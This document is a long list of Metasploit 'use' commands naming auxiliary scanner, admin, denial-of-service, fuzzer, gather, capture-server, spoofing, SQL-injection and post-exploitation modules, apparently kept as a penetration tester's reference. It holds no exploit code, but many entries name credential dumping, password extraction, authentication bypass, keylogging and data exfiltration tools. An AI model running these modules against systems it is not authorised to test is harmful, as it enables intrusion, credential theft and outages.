use auxiliary/scanner/misc/clamav_control
use auxiliary/scanner/misc/dahua_dvr_auth_bypass
use auxiliary/scanner/misc/dvr_config_disclosure
use auxiliary/scanner/misc/easycafe_server_fileaccess
use auxiliary/scanner/misc/ib_service_mgr_info
use auxiliary/scanner/misc/java_rmi_server
use auxiliary/scanner/misc/oki_scanner
use auxiliary/scanner/misc/poisonivy_control_scanner
use auxiliary/scanner/misc/raysharp_dvr_passwords
use auxiliary/scanner/misc/rosewill_rxs3211_passwords
use auxiliary/scanner/misc/sercomm_backdoor_scanner
use auxiliary/scanner/misc/sunrpc_portmapper
use auxiliary/scanner/misc/zenworks_preboot_fileaccess
use auxiliary/scanner/mongodb/mongodb_login
use auxiliary/scanner/motorola/timbuktu_udp
use auxiliary/scanner/msf/msf_rpc_login
use auxiliary/scanner/msf/msf_web_login
use auxiliary/scanner/mssql/mssql_hashdump
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_schemadump
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/natpmp/natpmp_portscan
use auxiliary/scanner/nessus/nessus_ntp_login
use auxiliary/scanner/nessus/nessus_rest_login
use auxiliary/scanner/nessus/nessus_xmlrpc_login
use auxiliary/scanner/nessus/nessus_xmlrpc_ping
use auxiliary/scanner/netbios/nbname
use auxiliary/scanner/nexpose/nexpose_api_login
use auxiliary/scanner/nfs/nfsmount
use auxiliary/scanner/ntp/ntp_monlist
use auxiliary/scanner/ntp/ntp_nak_to_the_future
use auxiliary/scanner/ntp/ntp_peer_list_dos
use auxiliary/scanner/ntp/ntp_peer_list_sum_dos
use auxiliary/scanner/ntp/ntp_readvar
use auxiliary/scanner/ntp/ntp_req_nonce_dos
use auxiliary/scanner/ntp/ntp_reslist_dos
use auxiliary/scanner/ntp/ntp_unsettrap_dos
use auxiliary/scanner/openvas/openvas_gsad_login
use auxiliary/scanner/openvas/openvas_omp_login
use auxiliary/scanner/openvas/openvas_otp_login
use auxiliary/scanner/oracle/emc_sid
use auxiliary/scanner/oracle/isqlplus_login
use auxiliary/scanner/oracle/isqlplus_sidbrute
use auxiliary/scanner/oracle/oracle_hashdump
use auxiliary/scanner/oracle/oracle_login
use auxiliary/scanner/oracle/sid_brute
use auxiliary/scanner/oracle/sid_enum
use auxiliary/scanner/oracle/spy_sid
use auxiliary/scanner/oracle/tnslsnr_version
use auxiliary/scanner/oracle/tnspoison_checker
use auxiliary/scanner/oracle/xdb_sid
use auxiliary/scanner/oracle/xdb_sid_brute
use auxiliary/scanner/pcanywhere/pcanywhere_login
use auxiliary/scanner/pcanywhere/pcanywhere_tcp
use auxiliary/scanner/pcanywhere/pcanywhere_udp
use auxiliary/scanner/pop3/pop3_login
use auxiliary/scanner/pop3/pop3_version
use auxiliary/scanner/portmap/portmap_amp
use auxiliary/scanner/portscan/ack
use auxiliary/scanner/portscan/ftpbounce
use auxiliary/scanner/portscan/syn
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/xmas
use auxiliary/scanner/postgres/postgres_dbname_flag_injection
use auxiliary/scanner/postgres/postgres_hashdump
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_schemadump
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/printer/canon_iradv_pwd_extract
use auxiliary/scanner/printer/printer_delete_file
use auxiliary/scanner/printer/printer_download_file
use auxiliary/scanner/printer/printer_env_vars
use auxiliary/scanner/printer/printer_list_dir
use auxiliary/scanner/printer/printer_list_volumes
use auxiliary/scanner/printer/printer_ready_message
use auxiliary/scanner/printer/printer_upload_file
use auxiliary/scanner/printer/printer_version_info
use auxiliary/scanner/quake/server_info
use auxiliary/scanner/rdp/ms12_020_check
use auxiliary/scanner/redis/file_upload
use auxiliary/scanner/redis/redis_login
use auxiliary/scanner/redis/redis_server
use auxiliary/scanner/rogue/rogue_recv
use auxiliary/scanner/rogue/rogue_send
use auxiliary/scanner/rservices/rexec_login
use auxiliary/scanner/rservices/rlogin_login
use auxiliary/scanner/rservices/rsh_login
use auxiliary/scanner/rsync/modules_list
use auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt
use auxiliary/scanner/sap/sap_hostctrl_getcomputersystem
use auxiliary/scanner/sap/sap_icf_public_info
use auxiliary/scanner/sap/sap_icm_urlscan
use auxiliary/scanner/sap/sap_mgmt_con_abaplog
use auxiliary/scanner/sap/sap_mgmt_con_brute_login
use auxiliary/scanner/sap/sap_mgmt_con_extractusers
use auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints
use auxiliary/scanner/sap/sap_mgmt_con_getenv
use auxiliary/scanner/sap/sap_mgmt_con_getlogfiles
use auxiliary/scanner/sap/sap_mgmt_con_getprocesslist
use auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter
use auxiliary/scanner/sap/sap_mgmt_con_instanceproperties
use auxiliary/scanner/sap/sap_mgmt_con_listlogfiles
use auxiliary/scanner/sap/sap_mgmt_con_startprofile
use auxiliary/scanner/sap/sap_mgmt_con_version
use auxiliary/scanner/sap/sap_router_info_request
use auxiliary/scanner/sap/sap_router_portscanner
use auxiliary/scanner/sap/sap_service_discovery
use auxiliary/scanner/sap/sap_smb_relay
use auxiliary/scanner/sap/sap_soap_bapi_user_create1
use auxiliary/scanner/sap/sap_soap_rfc_brute_login
use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing
use auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence
use auxiliary/scanner/sap/sap_soap_rfc_ping
use auxiliary/scanner/sap/sap_soap_rfc_read_table
use auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir
use auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface
use auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec
use auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec
use auxiliary/scanner/sap/sap_soap_rfc_system_info
use auxiliary/scanner/sap/sap_soap_th_saprel_disclosure
use auxiliary/scanner/sap/sap_web_gui_brute_login
use auxiliary/scanner/scada/digi_addp_reboot
use auxiliary/scanner/scada/digi_addp_version
use auxiliary/scanner/scada/digi_realport_serialport_scan
use auxiliary/scanner/scada/digi_realport_version
use auxiliary/scanner/scada/indusoft_ntwebserver_fileaccess
use auxiliary/scanner/scada/koyo_login
use auxiliary/scanner/scada/modbus_findunitid
use auxiliary/scanner/scada/modbusclient
use auxiliary/scanner/scada/modbusdetect
use auxiliary/scanner/scada/profinet_siemens
use auxiliary/scanner/scada/sielco_winlog_fileaccess
use auxiliary/scanner/sip/enumerator
use auxiliary/scanner/sip/enumerator_tcp
use auxiliary/scanner/sip/options
use auxiliary/scanner/sip/options_tcp
use auxiliary/scanner/sip/sipdroid_ext_enum
use auxiliary/scanner/smb/pipe_auditor
use auxiliary/scanner/smb/pipe_dcerpc_auditor
use auxiliary/scanner/smb/psexec_loggedin_users
use auxiliary/scanner/smb/smb2
use auxiliary/scanner/smb/smb_enum_gpp
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumusers_domain
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/smb_lookupsid
use auxiliary/scanner/smb/smb_uninit_cred
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smtp/smtp_enum
use auxiliary/scanner/smtp/smtp_ntlm_domain
use auxiliary/scanner/smtp/smtp_relay
use auxiliary/scanner/smtp/smtp_version
use auxiliary/scanner/snmp/aix_version
use auxiliary/scanner/snmp/arris_dg950
use auxiliary/scanner/snmp/brocade_enumhash
use auxiliary/scanner/snmp/cisco_config_tftp
use auxiliary/scanner/snmp/cisco_upload_file
use auxiliary/scanner/snmp/netopia_enum
use auxiliary/scanner/snmp/sbg6580_enum
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enum_hp_laserjet
use auxiliary/scanner/snmp/snmp_enumshares
use auxiliary/scanner/snmp/snmp_enumusers
use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_set
use auxiliary/scanner/snmp/ubee_ddw3611
use auxiliary/scanner/snmp/xerox_workcentre_enumusers
use auxiliary/scanner/ssh/apache_karaf_command_execution
use auxiliary/scanner/ssh/cerberus_sftp_enumusers
use auxiliary/scanner/ssh/detect_kippo
use auxiliary/scanner/ssh/fortinet_backdoor
use auxiliary/scanner/ssh/juniper_backdoor
use auxiliary/scanner/ssh/karaf_login
use auxiliary/scanner/ssh/ssh_enumusers
use auxiliary/scanner/ssh/ssh_identify_pubkeys
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ssh/ssh_login_pubkey
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssl/openssl_ccs
use auxiliary/scanner/ssl/openssl_heartbleed
use auxiliary/scanner/steam/server_info
use auxiliary/scanner/telephony/wardial
use auxiliary/scanner/telnet/brocade_enable_login
use auxiliary/scanner/telnet/lantronix_telnet_password
use auxiliary/scanner/telnet/lantronix_telnet_version
use auxiliary/scanner/telnet/telnet_encrypt_overflow
use auxiliary/scanner/telnet/telnet_login
use auxiliary/scanner/telnet/telnet_ruggedcom
use auxiliary/scanner/telnet/telnet_version
use auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp
use auxiliary/scanner/tftp/netdecision_tftp
use auxiliary/scanner/tftp/tftpbrute
use auxiliary/scanner/udp/udp_amplification
use auxiliary/scanner/udp_scanner_template
use auxiliary/scanner/upnp/ssdp_amp
use auxiliary/scanner/upnp/ssdp_msearch
use auxiliary/scanner/vmware/esx_fingerprint
use auxiliary/scanner/vmware/vmauthd_login
use auxiliary/scanner/vmware/vmauthd_version
use auxiliary/scanner/vmware/vmware_enum_permissions
use auxiliary/scanner/vmware/vmware_enum_sessions
use auxiliary/scanner/vmware/vmware_enum_users
use auxiliary/scanner/vmware/vmware_enum_vms
use auxiliary/scanner/vmware/vmware_host_details
use auxiliary/scanner/vmware/vmware_http_login
use auxiliary/scanner/vmware/vmware_screenshot_stealer
use auxiliary/scanner/vmware/vmware_server_dir_trav
use auxiliary/scanner/vmware/vmware_update_manager_traversal
use auxiliary/scanner/vnc/vnc_login
use auxiliary/scanner/vnc/vnc_none_auth
use auxiliary/scanner/voice/recorder
use auxiliary/scanner/vxworks/wdbrpc_bootline
use auxiliary/scanner/vxworks/wdbrpc_version
use auxiliary/scanner/winrm/winrm_auth_methods
use auxiliary/scanner/winrm/winrm_cmd
use auxiliary/scanner/winrm/winrm_login
use auxiliary/scanner/winrm/winrm_wql
use auxiliary/scanner/x11/open_x11
msf >use auxiliarys/
use auxiliary/admin/android/google_play_store_uxss_xframe_rce
use auxiliary/admin/appletv/appletv_display_image
use auxiliary/admin/appletv/appletv_display_video
use auxiliary/admin/backupexec/dump
use auxiliary/admin/backupexec/registry
use auxiliary/admin/chromecast/chromecast_reset
use auxiliary/admin/chromecast/chromecast_youtube
use auxiliary/admin/cisco/cisco_secure_acs_bypass
use auxiliary/admin/cisco/vpn_3000_ftp_bypass
use auxiliary/admin/db2/db2rcmd
use auxiliary/admin/edirectory/edirectory_dhost_cookie
use auxiliary/admin/edirectory/edirectory_edirutil
use auxiliary/admin/emc/alphastor_devicemanager_exec
use auxiliary/admin/emc/alphastor_librarymanager_exec
use auxiliary/admin/firetv/firetv_youtube
use auxiliary/admin/hp/hp_data_protector_cmd
use auxiliary/admin/hp/hp_imc_som_create_account
use auxiliary/admin/http/arris_motorola_surfboard_backdoor_xss
use auxiliary/admin/http/axigen_file_access
use auxiliary/admin/http/cfme_manageiq_evm_pass_reset
use auxiliary/admin/http/contentkeeper_fileaccess
use auxiliary/admin/http/dlink_dir_300_600_exec_noauth
use auxiliary/admin/http/dlink_dir_645_password_extractor
use auxiliary/admin/http/dlink_dsl320b_password_extractor
use auxiliary/admin/http/foreman_openstack_satellite_priv_esc
use auxiliary/admin/http/hp_web_jetadmin_exec
use auxiliary/admin/http/iis_auth_bypass
use auxiliary/admin/http/intersil_pass_reset
use auxiliary/admin/http/iomega_storcenterpro_sessionid
use auxiliary/admin/http/jboss_bshdeployer
use auxiliary/admin/http/jboss_deploymentfilerepository
use auxiliary/admin/http/jboss_seam_exec
use auxiliary/admin/http/katello_satellite_priv_esc
use auxiliary/admin/http/linksys_e1500_e2500_exec
use auxiliary/admin/http/linksys_tmunblock_admin_reset_bof
use auxiliary/admin/http/linksys_wrt54gl_exec
use auxiliary/admin/http/manage_engine_dc_create_admin
use auxiliary/admin/http/manageengine_dir_listing
use auxiliary/admin/http/manageengine_file_download
use auxiliary/admin/http/manageengine_pmp_privesc
use auxiliary/admin/http/mutiny_frontend_read_delete
use auxiliary/admin/http/netflow_file_download
use auxiliary/admin/http/nexpose_xxe_file_read
use auxiliary/admin/http/novell_file_reporter_filedelete
use auxiliary/admin/http/openbravo_xxe
use auxiliary/admin/http/rails_devise_pass_reset
use auxiliary/admin/http/scrutinizer_add_user
use auxiliary/admin/http/sophos_wpa_traversal
use auxiliary/admin/http/tomcat_administration
use auxiliary/admin/http/tomcat_utf8_traversal
use auxiliary/admin/http/typo3_sa_2009_001
use auxiliary/admin/http/typo3_sa_2009_002
use auxiliary/admin/http/typo3_sa_2010_020
use auxiliary/admin/http/typo3_winstaller_default_enc_keys
use auxiliary/admin/http/vbulletin_upgrade_admin
use auxiliary/admin/http/wp_custom_contact_forms
use auxiliary/admin/http/wp_easycart_privilege_escalation
use auxiliary/admin/http/wp_wplms_privilege_escalation
use auxiliary/admin/http/zyxel_admin_password_extractor
use auxiliary/admin/kerberos/ms14_068_kerberos_checksum
use auxiliary/admin/maxdb/maxdb_cons_exec
use auxiliary/admin/misc/sercomm_dump_config
use auxiliary/admin/misc/wol
use auxiliary/admin/motorola/wr850g_cred
use auxiliary/admin/ms/ms08_059_his2006
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mssql/mssql_enum_domain_accounts
use auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli
use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_escalate_dbowner
use auxiliary/admin/mssql/mssql_escalate_dbowner_sqli
use auxiliary/admin/mssql/mssql_escalate_execute_as
use auxiliary/admin/mssql/mssql_escalate_execute_as_sqli
use auxiliary/admin/mssql/mssql_exec
use auxiliary/admin/mssql/mssql_findandsampledata
use auxiliary/admin/mssql/mssql_idf
use auxiliary/admin/mssql/mssql_ntlm_stealer
use auxiliary/admin/mssql/mssql_ntlm_stealer_sqli
use auxiliary/admin/mssql/mssql_sql
use auxiliary/admin/mssql/mssql_sql_file
use auxiliary/admin/mysql/mysql_enum
use auxiliary/admin/mysql/mysql_sql
use auxiliary/admin/natpmp/natpmp_map
use auxiliary/admin/officescan/tmlisten_traversal
use auxiliary/admin/oracle/ora_ntlm_stealer
use auxiliary/admin/oracle/oracle_login
use auxiliary/admin/oracle/oracle_sql
use auxiliary/admin/oracle/oraenum
use auxiliary/admin/oracle/osb_execqr
use auxiliary/admin/oracle/osb_execqr2
use auxiliary/admin/oracle/osb_execqr3
use auxiliary/admin/oracle/post_exploitation/win32exec
use auxiliary/admin/oracle/post_exploitation/win32upload
use auxiliary/admin/oracle/sid_brute
use auxiliary/admin/oracle/tnscmd
use auxiliary/admin/pop2/uw_fileretrieval
use auxiliary/admin/postgres/postgres_readfile
use auxiliary/admin/postgres/postgres_sql
use auxiliary/admin/sap/sap_configservlet_exec_noauth
use auxiliary/admin/sap/sap_mgmt_con_osexec
use auxiliary/admin/scada/ge_proficy_substitute_traversal
use auxiliary/admin/scada/modicon_command
use auxiliary/admin/scada/modicon_password_recovery
use auxiliary/admin/scada/modicon_stux_transfer
use auxiliary/admin/scada/multi_cip_command
use auxiliary/admin/scada/yokogawa_bkbcopyd_client
use auxiliary/admin/serverprotect/file
use auxiliary/admin/smb/check_dir_file
use auxiliary/admin/smb/delete_file
use auxiliary/admin/smb/download_file
use auxiliary/admin/smb/list_directory
use auxiliary/admin/smb/psexec_command
use auxiliary/admin/smb/psexec_ntdsgrab
use auxiliary/admin/smb/samba_symlink_traversal
use auxiliary/admin/smb/upload_file
use auxiliary/admin/sunrpc/solaris_kcms_readfile
use auxiliary/admin/tftp/tftp_transfer_util
use auxiliary/admin/tikiwiki/tikidblib
use auxiliary/admin/vmware/poweroff_vm
use auxiliary/admin/vmware/poweron_vm
use auxiliary/admin/vmware/tag_vm
use auxiliary/admin/vmware/terminate_esx_sessions
use auxiliary/admin/vnc/realvnc_41_bypass
use auxiliary/admin/vxworks/apple_airport_extreme_password
use auxiliary/admin/vxworks/dlink_i2eye_autoanswer
use auxiliary/admin/vxworks/wdbrpc_memory_dump
use auxiliary/admin/vxworks/wdbrpc_reboot
use auxiliary/admin/webmin/edit_html_fileaccess
use auxiliary/admin/webmin/file_disclosure
use auxiliary/admin/zend/java_bridge
use auxiliary/analyze/jtr_aix
use auxiliary/analyze/jtr_crack_fast
use auxiliary/analyze/jtr_linux
use auxiliary/analyze/jtr_mssql_fast
use auxiliary/analyze/jtr_mysql_fast
use auxiliary/analyze/jtr_oracle_fast
use auxiliary/analyze/jtr_postgres_fast
use auxiliary/bnat/bnat_router
use auxiliary/bnat/bnat_scan
use auxiliary/client/smtp/emailer
use auxiliary/crawler/msfcrawler
use auxiliary/docx/word_unc_injector
use auxiliary/dos/cisco/ios_http_percentpercent
use auxiliary/dos/dhcp/isc_dhcpd_clientid
use auxiliary/dos/freebsd/nfsd/nfsd_mount
use auxiliary/dos/hp/data_protector_rds
use auxiliary/dos/http/3com_superstack_switch
use auxiliary/dos/http/apache_commons_fileupload_dos
use auxiliary/dos/http/apache_mod_isapi
use auxiliary/dos/http/apache_range_dos
use auxiliary/dos/http/canon_wireless_printer
use auxiliary/dos/http/dell_openmanage_post
use auxiliary/dos/http/gzip_bomb_dos
use auxiliary/dos/http/hashcollision_dos
use auxiliary/dos/http/monkey_headers
use auxiliary/dos/http/ms15_034_ulonglongadd
use auxiliary/dos/http/nodejs_pipelining
use auxiliary/dos/http/novell_file_reporter_heap_bof
use auxiliary/dos/http/rails_action_view
use auxiliary/dos/http/rails_json_float_dos
use auxiliary/dos/http/sonicwall_ssl_format
use auxiliary/dos/http/webrick_regex
use auxiliary/dos/http/wordpress_long_password_dos
use auxiliary/dos/http/wordpress_xmlrpc_dos
use auxiliary/dos/mdns/avahi_portzero
use auxiliary/dos/misc/dopewars
use auxiliary/dos/misc/ibm_sametime_webplayer_dos
use auxiliary/dos/misc/memcached
use auxiliary/dos/ntp/ntpd_reserved_dos
use auxiliary/dos/pptp/ms02_063_pptp_dos
use auxiliary/dos/samba/lsa_addprivs_heap
use auxiliary/dos/samba/lsa_transnames_heap
use auxiliary/dos/samba/read_nttrans_ea_list
use auxiliary/dos/sap/sap_soap_rfc_eps_delete_file
use auxiliary/dos/scada/beckhoff_twincat
use auxiliary/dos/scada/d20_tftp_overflow
use auxiliary/dos/scada/igss9_dataserver
use auxiliary/dos/scada/yokogawa_logsvr
use auxiliary/dos/smtp/sendmail_prescan
use auxiliary/dos/solaris/lpd/cascade_delete
use auxiliary/dos/ssl/dtls_changecipherspec
use auxiliary/dos/ssl/dtls_fragment_overflow
use auxiliary/dos/ssl/openssl_aesni
use auxiliary/dos/syslog/rsyslog_long_tag
use auxiliary/dos/tcp/junos_tcp_opt
use auxiliary/dos/tcp/synflood
use auxiliary/dos/upnp/miniupnpd_dos
use auxiliary/dos/windows/appian/appian_bpm
use auxiliary/dos/windows/browser/ms09_065_eot_integer
use auxiliary/dos/windows/ftp/filezilla_admin_user
use auxiliary/dos/windows/ftp/filezilla_server_port
use auxiliary/dos/windows/ftp/guildftp_cwdlist
use auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof
use auxiliary/dos/windows/ftp/iis_list_exhaustion
use auxiliary/dos/windows/ftp/solarftp_user
use auxiliary/dos/windows/ftp/titan626_site
use auxiliary/dos/windows/ftp/vicftps50_list
use auxiliary/dos/windows/ftp/winftp230_nlst
use auxiliary/dos/windows/ftp/xmeasy560_nlst
use auxiliary/dos/windows/ftp/xmeasy570_nlst
use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
use auxiliary/dos/windows/http/pi3web_isapi
use auxiliary/dos/windows/llmnr/ms11_030_dnsapi
use auxiliary/dos/windows/nat/nat_helper
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
use auxiliary/dos/windows/smb/ms05_047_pnp
use auxiliary/dos/windows/smb/ms06_035_mailslot
use auxiliary/dos/windows/smb/ms06_063_trans
use auxiliary/dos/windows/smb/ms09_001_write
use auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh
use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff
use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
use auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow
use auxiliary/dos/windows/smb/ms11_019_electbowser
use auxiliary/dos/windows/smb/rras_vls_null_deref
use auxiliary/dos/windows/smb/vista_negotiate_stop
use auxiliary/dos/windows/smtp/ms06_019_exchange
use auxiliary/dos/windows/ssh/sysax_sshd_kexchange
use auxiliary/dos/windows/tftp/pt360_write
use auxiliary/dos/windows/tftp/solarwinds
use auxiliary/dos/wireshark/capwap
use auxiliary/dos/wireshark/chunked
use auxiliary/dos/wireshark/cldap
use auxiliary/dos/wireshark/ldap
use auxiliary/fuzzers/dns/dns_fuzzer
use auxiliary/fuzzers/ftp/client_ftp
use auxiliary/fuzzers/ftp/ftp_pre_post
use auxiliary/fuzzers/http/http_form_field
use auxiliary/fuzzers/http/http_get_uri_long
use auxiliary/fuzzers/http/http_get_uri_strings
use auxiliary/fuzzers/ntp/ntp_protocol_fuzzer
use auxiliary/fuzzers/smb/smb2_negotiate_corrupt
use auxiliary/fuzzers/smb/smb_create_pipe
use auxiliary/fuzzers/smb/smb_create_pipe_corrupt
use auxiliary/fuzzers/smb/smb_negotiate_corrupt
use auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt
use auxiliary/fuzzers/smb/smb_tree_connect
use auxiliary/fuzzers/smb/smb_tree_connect_corrupt
use auxiliary/fuzzers/smtp/smtp_fuzzer
use auxiliary/fuzzers/ssh/ssh_kexinit_corrupt
use auxiliary/fuzzers/ssh/ssh_version_15
use auxiliary/fuzzers/ssh/ssh_version_2
use auxiliary/fuzzers/ssh/ssh_version_corrupt
use auxiliary/fuzzers/tds/tds_login_corrupt
use auxiliary/fuzzers/tds/tds_login_username
use auxiliary/fuzzers/tftp/tftp_fuzzer
use auxiliary/gather/alienvault_iso27001_sqli
use auxiliary/gather/alienvault_newpolicyform_sqli
use auxiliary/gather/android_browser_new_tab_cookie_theft
use auxiliary/gather/android_htmlfileprovider
use auxiliary/gather/android_stock_browser_uxss
use auxiliary/gather/apache_rave_creds
use auxiliary/gather/apple_safari_webarchive_uxss
use auxiliary/gather/checkpoint_hostname
use auxiliary/gather/chromecast_wifi
use auxiliary/gather/citrix_published_applications
use auxiliary/gather/citrix_published_bruteforce
use auxiliary/gather/coldfusion_pwd_props
use auxiliary/gather/corpwatch_lookup_id
use auxiliary/gather/corpwatch_lookup_name
use auxiliary/gather/d20pass
use auxiliary/gather/dns_bruteforce
use auxiliary/gather/dns_cache_scraper
use auxiliary/gather/dns_info
use auxiliary/gather/dns_reverse_lookup
use auxiliary/gather/dns_srv_enum
use auxiliary/gather/doliwamp_traversal_creds
use auxiliary/gather/drupal_openid_xxe
use auxiliary/gather/eaton_nsm_creds
use auxiliary/gather/emc_cta_xxe
use auxiliary/gather/enum_dns
use auxiliary/gather/eventlog_cred_disclosure
use auxiliary/gather/external_ip
use auxiliary/gather/f5_bigip_cookie_disclosure
use auxiliary/gather/flash_rosetta_jsonp_url_disclosure
use auxiliary/gather/hp_enum_perfd
use auxiliary/gather/hp_snac_domain_creds
use auxiliary/gather/huawei_wifi_info
use auxiliary/gather/ibm_sametime_enumerate_users
use auxiliary/gather/ibm_sametime_room_brute
use auxiliary/gather/ibm_sametime_version
use auxiliary/gather/ie_uxss_injection
use auxiliary/gather/impersonate_ssl
use auxiliary/gather/java_rmi_registry
use auxiliary/gather/joomla_weblinks_sqli
use auxiliary/gather/konica_minolta_pwd_extract
use auxiliary/gather/mantisbt_admin_sqli
use auxiliary/gather/mcafee_epo_xxe
use auxiliary/gather/memcached_extractor
use auxiliary/gather/mongodb_js_inject_collection_enum
use auxiliary/gather/ms14_052_xmldom
use auxiliary/gather/mybb_db_fingerprint
use auxiliary/gather/natpmp_external_address
use auxiliary/gather/opennms_xxe
use auxiliary/gather/search_email_collector
use auxiliary/gather/shodan_search
use auxiliary/gather/solarwinds_orion_sqli
use auxiliary/gather/trackit_sql_domain_creds
use auxiliary/gather/vbulletin_vote_sqli
use auxiliary/gather/windows_deployment_services_shares
use auxiliary/gather/wp_w3_total_cache_hash_extract
use auxiliary/gather/xbmc_traversal
use auxiliary/gather/xerox_pwd_extract
use auxiliary/gather/xerox_workcentre_5xxx_ldap
use auxiliary/parser/unattend
use auxiliary/pdf/foxit/authbypass
use auxiliary/scanner/fuzzer/imap_fuzzer
use auxiliary/scanner/fuzzer/tftp_fuzzer
use auxiliary/scanner/http/cn_caidao_backdoor_bruteforce
use auxiliary/scanner/http/cold_fusion_version
use auxiliary/scanner/http/http_title
use auxiliary/scanner/http/linknat_vos_manager_userpass
use auxiliary/scanner/http/vmware_server_dir_trav
use auxiliary/scanner/http/vmware_update_manager_traversal
use auxiliary/scanner/misc/redis_server
use auxiliary/scanner/netbios/nbname_probe
use auxiliary/scanner/sip/enumerator_asterisk_nat_peers
use auxiliary/scanner/sip/sipcrack
use auxiliary/scanner/sip/sipcrack_tcp
use auxiliary/scanner/sip/sipflood
use auxiliary/scanner/sip/sipflood_tcp
use auxiliary/scanner/sip/sipinvite
use auxiliary/scanner/sip/sipinvite_tcp
use auxiliary/scanner/sip/sipscan
use auxiliary/scanner/sip/sipscan_tcp
use auxiliary/scanner/telnet/telnet_version2
use auxiliary/server/browser_autopwn
use auxiliary/server/capture/drda
use auxiliary/server/capture/ftp
use auxiliary/server/capture/http
use auxiliary/server/capture/http_basic
use auxiliary/server/capture/http_javascript_keylogger
use auxiliary/server/capture/http_ntlm
use auxiliary/server/capture/imap
use auxiliary/server/capture/mssql
use auxiliary/server/capture/mysql
use auxiliary/server/capture/pop3
use auxiliary/server/capture/postgresql
use auxiliary/server/capture/printjob_capture
use auxiliary/server/capture/sip
use auxiliary/server/capture/smb
use auxiliary/server/capture/smtp
use auxiliary/server/capture/telnet
use auxiliary/server/capture/vnc
use auxiliary/server/dhclient_bash_env
use auxiliary/server/dhcp
use auxiliary/server/dns/spoofhelper
use auxiliary/server/fakedns
use auxiliary/server/ftp
use auxiliary/server/http_ntlmrelay
use auxiliary/server/icmp_exfil
use auxiliary/server/openssl_heartbeat_client_memory
use auxiliary/server/pxeexploit
use auxiliary/server/socks4a
use auxiliary/server/socks_unc
use auxiliary/server/tftp
use auxiliary/server/tnftp_savefile
use auxiliary/server/webkit_xslt_dropper
use auxiliary/server/wget_symlink_file_write
use auxiliary/server/wpad
use auxiliary/sniffer/psnuffle
use auxiliary/spoof/arp/arp_poisoning
use auxiliary/spoof/cisco/cdp
use auxiliary/spoof/cisco/dtp
use auxiliary/spoof/dns/bailiwicked_domain
use auxiliary/spoof/dns/bailiwicked_host
use auxiliary/spoof/dns/compare_results
use auxiliary/spoof/llmnr/llmnr_response
use auxiliary/spoof/nbns/nbns_response
use auxiliary/spoof/replay/pcap_replay
use auxiliary/sqli/oracle/dbms_cdc_ipublish
use auxiliary/sqli/oracle/dbms_cdc_publish
use auxiliary/sqli/oracle/dbms_cdc_publish2
use auxiliary/sqli/oracle/dbms_cdc_publish3
use auxiliary/sqli/oracle/dbms_cdc_subscribe_activate_subscription
use auxiliary/sqli/oracle/dbms_export_extension
use auxiliary/sqli/oracle/dbms_metadata_get_granted_xml
use auxiliary/sqli/oracle/dbms_metadata_get_xml
use auxiliary/sqli/oracle/dbms_metadata_open
use auxiliary/sqli/oracle/droptable_trigger
use auxiliary/sqli/oracle/jvm_os_code_10g
use auxiliary/sqli/oracle/jvm_os_code_11g
use auxiliary/sqli/oracle/lt_compressworkspace
use auxiliary/sqli/oracle/lt_findricset_cursor
use auxiliary/sqli/oracle/lt_mergeworkspace
use auxiliary/sqli/oracle/lt_removeworkspace
use auxiliary/sqli/oracle/lt_rollbackworkspace
use auxiliary/voip/asterisk_login
use auxiliary/voip/cisco_cucdm_call_forward
use auxiliary/voip/cisco_cucdm_speed_dials
use auxiliary/voip/sip_deregister
use auxiliary/voip/sip_invite_spoof
use auxiliary/vsploit/malware/dns/dns_mariposa
use auxiliary/vsploit/malware/dns/dns_query
use auxiliary/vsploit/malware/dns/dns_zeus
use auxiliary/vsploit/pii/email_pii
use auxiliary/vsploit/pii/web_pii




# post :

use post/aix/hashdump
use post/cisco/gather/enum_cisco
use post/firefox/gather/cookies
use post/firefox/gather/history
use post/firefox/gather/passwords
use post/firefox/gather/xss
use post/firefox/manage/webcam_chat
use post/linux/gather/checkvm
use post/linux/gather/ecryptfs_creds
use post/linux/gather/enum_configs
use post/linux/gather/enum_network
use post/linux/gather/enum_protections
use post/linux/gather/enum_psk
use post/linux/gather/enum_system
